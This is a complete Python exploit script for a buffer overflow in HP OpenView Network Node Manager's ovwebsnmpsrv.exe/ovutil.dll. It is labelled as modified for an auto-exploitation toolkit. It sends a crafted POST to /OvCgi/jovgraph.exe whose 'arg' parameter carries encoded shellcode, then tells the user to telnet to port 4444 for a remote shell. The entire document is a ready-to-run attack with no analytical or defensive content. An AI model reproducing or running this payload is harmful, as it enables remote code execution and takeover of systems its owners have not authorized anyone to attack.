import socket
import sys

ip = sys.argv[1]
#ip = "192.168.1.0"
port = int(sys.argv[2])
#port = 80

target = (ip, port)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(target)

print "HP OpenView Network Node Manager ovwebsnmpsrv.exe ovutil Buffer Overflow"
print "Buffer overflow in ovutil.dll in ovwebsnmpsrv.exe in HP OpenView Network Node Manager (OV NNM) 7.51 and 7.53 allows remote attackers to execute arbitrary code via unspecified variables to jovgraph.exe, which are not properly handled in a call to the sprintf function."
print ""
print "Modified by QUAKERDOOMER for winAUTOPWN"


headers  = 'POST /OvCgi/jovgraph.exe HTTP/1.1\r\n'
headers += 'Host: %s\r\n' % ip
headers += 'User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)\r\n'
headers += 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n'
headers += 'Accept-Language: en-us,en;q=0.5\r\n'
headers += 'Accept-Encoding: gzip,deflate\r\n'
headers += 'Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n'
headers += 'Keep-Alive: 300\r\n'
headers += 'Content-Type: application/x-www-form-urlencoded\r\n'
headers += 'Content-Length: 1689\r\n\r\n'
headers += 'arg=9%f2%db%b5%15%8e%ba%f7%c55%9b%97%b8%9e%b7%23%a9S1Ux%ce%b8%ca%29%3d5%ab%86%d8%e93%3c%ae%d4%dc%5f%cdx%9d%c5%c6kk%28%c8F%27%07%8c%ae%b5C%ebZ%84Y%04%8c%1d%f3pJ%a8R%2a%aci0%3cJ7%03%3dB%d0lE%e2%7d%ac%8e%1c%91%05%d3%b6%e5%85%c0c%ccgbU%1f%dc%e2E%e93%7b%b5%7f%a2%05%a1%beb%9f%87%96I%9d%98%08%5e%e9%ad%88Hh%e5\%a2x%b4y6%e5W%d9%11rr%3a%bb%f8Ys%29%02%18%83%d8%88%93%eb%29T%d3%15s%d3K0%7f%7c%b2%28%2b%7d%bdW%f5%eeQ9%cdP%bb%1b%9e%ff%86%ec%b2%d6%b7%b1%26A%c1JZ%ee%c5%e1%3ao%b9%fa%8d%dd%a7%eb%8f%907%e2%b6%a93%9e%3c%88%88%14%16s%cbz%f5%9c%adq%9bF%83%1a%b6%7c%af%d9h%cc%begPL%1aRZ%1eru%83%8e%3a%1b%bc%df%8d%e1%05%1b%a6%85%fb%ca%89%ca%21%85%94d%dd%93%ee%e0%f3%dc6%df%aa%02ZA%01%40Z%dc%9fEZ%80%98%21Z%81%c4T%f2%ff%ff1%c9%83%e9%aa%e8%ff%ff%ff%ff%c0%5e%81v%0e%9a%c5%d6%a2%83%ee%fc%e2%f4f-%5f%a2%9a%c5%b6%2b%7f%f4%04%c6%11%97%e6%29%c8%c9%5d%f0%8eN%a4%8a%95r%9c%84%ab%3a%e7b6%f9%b7%de%98%e9%f6cU%c8%d7ex5%84%f5%11%97%c6%29%d8%f9%d7r%11%85%ae%27Z%b1%9c%a3J%95%5d%ea%82N%8e%82%9b%165%9e%d3N%e2%29%9b%13%e7%5d%ab%05zcU%c8%d7e%a2%25%a3V%99%b8.%99%e7%e1%a3%40%c2N%8e%86%9b%16%b0%29%96%8e%5d%fa%86%c4%05%29%9eN%d7r%13%81%f2%86%c1%9e%b7%fb%c0%94%29B%c2%9a%8c%29%88.P%ff%f2%f6%e4%a2%9a%ad%a1%d1%a8%9a%82%ca%d6%b2%f0%a5e%10n2%9b%c5%d6%8b%5e%91%86%ca%b3E%bd%a2e%10%86%f2%ca%95%96%f2%da%95%beH%95%1a6%5dOL%11%93A%96%be%a0%9a%d4%8a%2b%7c%af%c6%f4%cd%ad%14y%ad%a2%29w%c9%92%be%15s%fd%29%5dO%96%85%f5%f2%b1%3a%99%7b%3a%03%f5%13%02%be%d7%f4%88%b7%5dO%ad%b5%cf%fe%c5%5fA%cd%92%81%93l%af%c4%fb%cc%27%2b%c4%5d%81%f2%9e%9b%c4%5b%e6%be%d5%10%a2%de%91%86%f4%cc%93%90%f4%d4%93%80%f1%cc%ad%afn%a5C%29w%13%25%98%f4%dc%3a%e6%ca%92B%cb%c2e%10mR/g%80%ca%3cPk%3fe%10%ea%a4%e6%cfVYz%b0%d3%19%dd%d6%a4%cd%f0%c5%85%5dO%c5%d6%a2&sel=U&act=b\r\n'
headers += '\r\n'

s.sendall(str(headers))
print "Telnet to Target on port 4444 for shell if lucky"



